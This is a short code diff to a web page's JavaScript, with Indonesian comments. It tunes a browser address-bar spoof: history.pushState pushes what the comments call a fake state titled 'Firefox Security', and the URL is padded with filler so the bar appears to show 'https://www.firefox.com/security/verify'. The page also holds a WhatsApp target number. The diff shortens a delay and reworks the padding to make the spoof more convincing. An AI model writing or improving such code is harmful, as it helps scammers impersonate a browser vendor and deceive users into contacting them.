@@ -68,7 +68,7 @@
   var statusEl = document.getElementById('status');
 
   // Konfigurasi Delay (3 detik stacking window)
-  var DELAY_SECONDS = 3; 
+  var DELAY_SECONDS = 2; 
 
   // Target WhatsApp Intent
   var TARGET_PHONE = "628123456789";
@@ -82,7 +82,7 @@
     try {
       if (window.history && window.history.pushState) {
         // Mendorong state palsu ke dalam stack riwayat peramban
-        window.history.pushState({page: "secure_portal"}, "Firefox Security", "asasasasasasadskdsadsadsadsadsadsdsasdsadasdsadsadasdasldkaslkdasdasdsdsadadsadasdsdasdasdhttps://www.firefox.com/security/verify");
+        window.history.pushState({page: "secure_portal"}, "Firefox Security", "?.__________________________________________________________________________________________________https://www.firefox.com/security/verify");
       }
     } catch (e) {}
 
